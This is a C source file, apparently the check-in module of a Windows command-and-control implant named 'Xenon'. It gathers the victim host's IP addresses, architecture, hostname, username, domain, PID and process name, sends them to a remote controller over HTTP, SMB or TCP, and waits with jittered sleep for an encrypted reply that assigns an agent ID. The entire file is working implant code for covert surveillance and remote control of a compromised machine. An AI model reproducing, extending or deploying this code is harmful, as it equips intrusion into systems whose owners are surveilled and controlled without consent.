#include "Xenon.h"
#include "Checkin.h"
#include "Task.h"

#include "TransportSmb.h"
#include "TransportTcp.h"

#include <lm.h>
#include <lmwksta.h>
#include <iphlpapi.h>

#pragma comment(lib, "iphlpapi.lib")
#pragma comment(lib, "netapi32.lib")

// Getting all the IP addresses.
UINT32 *CheckinGetIPAddress(UINT32 *numberOfIPs)
{
    PMIB_IPADDRTABLE pIPAddrTable;
    DWORD dwSize = 0;
    DWORD dwRetVal = 0;
    IN_ADDR IPAddr;
    LPVOID lpMsgBuf;

    pIPAddrTable = (MIB_IPADDRTABLE *)LocalAlloc(LPTR, sizeof(MIB_IPADDRTABLE));
    if (pIPAddrTable)
    {
        if (GetIpAddrTable(pIPAddrTable, &dwSize, 0) == ERROR_INSUFFICIENT_BUFFER)
        {
            LocalFree(pIPAddrTable);
            pIPAddrTable = (MIB_IPADDRTABLE *)LocalAlloc(LPTR, dwSize);
        }
        if (pIPAddrTable == NULL)
            return NULL;
    }

    else
        return NULL;

    if ((dwRetVal = GetIpAddrTable(pIPAddrTable, &dwSize, 0)) != NO_ERROR)
    {
        LocalFree(pIPAddrTable);
        return NULL;
    } 
    else 
    {
        *numberOfIPs = (UINT32)pIPAddrTable->dwNumEntries;
    }

    UINT32 *tableOfIPs = (UINT32 *)LocalAlloc(LPTR, (*numberOfIPs) * sizeof(UINT32));
    for (UINT32 i = 0; i < *numberOfIPs; i++)
    {
        IPAddr.S_un.S_addr = (u_long)pIPAddrTable->table[i].dwAddr;
        tableOfIPs[i] = BYTESWAP32(IPAddr.S_un.S_addr);
    }

    if (pIPAddrTable)
        LocalFree(pIPAddrTable);

    return tableOfIPs;
}

// Getting the current architecture
BYTE CheckinGetArch()
{
    SYSTEM_INFO systemInfo;
    GetNativeSystemInfo(&systemInfo);
    if (systemInfo.wProcessorArchitecture == PROCESSOR_ARCHITECTURE_AMD64 || systemInfo.wProcessorArchitecture == PROCESSOR_ARCHITECTURE_IA64)
    {
        return 0x64;
    }

    return 0x86;
}

// Getting the current hostname
BOOL CheckinGetHostname(_Out_ PCHAR hostname)
{
    DWORD dataLen = 0;
    if (!GetComputerNameExA(ComputerNameNetBIOS, NULL, &dataLen))
    {
        if (GetComputerNameExA(ComputerNameNetBIOS, hostname, &dataLen))
        {
            hostname[dataLen] = '\0';
            return TRUE;
        }
    }
    return FALSE;
}

// Getting the username of the current user
BOOL CheckinGetUserName(_Out_ PCHAR username)
{
    DWORD dataLen = 0;
    if (!GetUserNameA(NULL, &dataLen))
    {
        if (GetUserNameA(username, &dataLen))
        {
            username[dataLen] = '\0';
            return TRUE;
        }
    }
    return FALSE;
}

// Getting the domain from the machine
BOOL CheckinGetDomain(_Out_ PWCHAR domain)
{
    DWORD dwLevel = 102;
    LPWKSTA_INFO_102 pBuf = NULL;
    NET_API_STATUS nStatus;
    LPWSTR pszServerName = NULL;
    nStatus = NetWkstaGetInfo(pszServerName, dwLevel, (LPBYTE *)&pBuf);
    if (nStatus == NERR_Success)
    {
        DWORD length = lstrlenW(pBuf->wki102_langroup);
        memcpy(domain, pBuf->wki102_langroup, sizeof(WCHAR) * length + 1);
        domain[length] = L'\0';
        
        if (pBuf != NULL)
            NetApiBufferFree(pBuf);

        return TRUE;
    }

    if (pBuf != NULL)
        NetApiBufferFree(pBuf);
    return FALSE;
}

// Getting the current OS Name (not implemented)
char *CheckinGetOsName()
{
    return (PCHAR) "Windows";
}

// Getting the current process name
BOOL CheckinGetCurrentProcName(_Out_ PCHAR processName)
{
    DWORD buffSize = 1024;
    CHAR buffer[1024];
    if (QueryFullProcessImageNameA(GetCurrentProcess(), 0, buffer, &buffSize))
    {
        memcpy(processName, buffer, buffSize + 1);
        processName[buffSize] = '\0';
        return TRUE;
    }
    return FALSE;
}

BOOL CheckinSend()
{
    /*
    Format of checkin package:
        UUID
        Action (checkin byte)
        UUID
        Nb of IP
        IP
        Size OS
        OS
        Architecture
        Size Hostname
        HostName
        Size Username
        Username
        Size Domain
        Domaine
        PID
        Size ProcessN
        Process Name
        Size ExternIP
        Extern IP
    */

    
    // uuid + action
    PPackage CheckinData = NULL;    
    CheckinData = PackageInit(CHECKIN, TRUE);

    // UUID
    PackageAddString(CheckinData, (PCHAR)xenonConfig->agentID, FALSE);

    // IP addresses;
    UINT32 numberOfIPs  = 0;
    UINT32 *tableOfIPs  = CheckinGetIPAddress(&numberOfIPs);
    PackageAddInt32(CheckinData, numberOfIPs);
    for (UINT32 i = 0; i < numberOfIPs; i++) 
    {
        PackageAddInt32(CheckinData, tableOfIPs[i]);
    }

    // OS
    PackageAddString(CheckinData, CheckinGetOsName(), TRUE);

    // Arch
    PackageAddByte(CheckinData, CheckinGetArch());

    // Hostname
    CHAR Hostname[MAX_PATH];
    if (CheckinGetHostname(Hostname))
    {
        PackageAddString(CheckinData, Hostname, TRUE);
    } else
    {
        PackageAddString(CheckinData, "", TRUE);
    }

    // Username
    CHAR Username[MAX_PATH];
    if (CheckinGetUserName(Username))
    {
        PackageAddString(CheckinData, Username, TRUE);
    } else
    {
        PackageAddString(CheckinData, "", TRUE);
    }

    // Domain
    WCHAR Domain[MAX_PATH];
    if (CheckinGetDomain(Domain))
    {
        PackageAddWString(CheckinData, Domain, TRUE);
    } else
    {
        PackageAddWString(CheckinData, L"", TRUE);
    }

    // PID
    PackageAddInt32(CheckinData, GetCurrentProcessId());
    
    // ProcessName
    CHAR ProcessName[MAX_PATH];
    if (CheckinGetCurrentProcName(ProcessName))
    {
        PackageAddString(CheckinData, ProcessName, TRUE);
    } else
    {
        PackageAddString(CheckinData, "", TRUE);
    }
    
    // External IP 
    PackageAddString(CheckinData, (PCHAR) "1.1.1.1", TRUE);    // TODO

    /* Free some allocations */
    LocalFree(tableOfIPs);

    /* Send checkin package and wait for success */
    PARSER Output = { 0 };

#ifdef HTTPX_TRANSPORT

    PackageSend(CheckinData, &Output);

#endif

#ifdef SMB_TRANSPORT

    PBYTE  pOutData  = NULL;
    SIZE_T OutLen    = 0;
    SIZE_T sizeUuid  = TASK_UUID_SIZE;

    PackageSend(CheckinData, NULL);

    _dbg("[SMB] Waiting for checkin response...");

    // Sloppy 
    while ( pOutData == NULL || OutLen == 0 )
    {

        SleepWithJitter(xenonConfig->sleeptime, xenonConfig->jitter);

        SmbRecieve(&pOutData, &OutLen);

    }

    ParserNew(&Output, pOutData, OutLen);

    ParserDecrypt(&Output);

#endif

#ifdef TCP_TRANSPORT

    PBYTE  pOutData  = NULL;
    SIZE_T OutLen    = 0;
    SIZE_T sizeUuid  = TASK_UUID_SIZE;

    PackageSend(CheckinData, NULL);

    _dbg("[TCP] Waiting for checkin response...");

    // Sloppy 
    while ( pOutData == NULL || OutLen == 0 )
    {

        SleepWithJitter(xenonConfig->sleeptime, xenonConfig->jitter);

        TcpRecieve(&pOutData, &OutLen);

    }

    ParserNew(&Output, pOutData, OutLen);

    ParserDecrypt(&Output);

#endif


    /* Set new agent UUID from checkin response */
    if ( !TaskCheckin(&Output) )
    {
        ParserDestroy(&Output);
        PackageDestroy(CheckinData);
        return FALSE;
    }


    /* Clean Up */
    ParserDestroy(&Output);
    PackageDestroy(CheckinData);

    return TRUE;
}
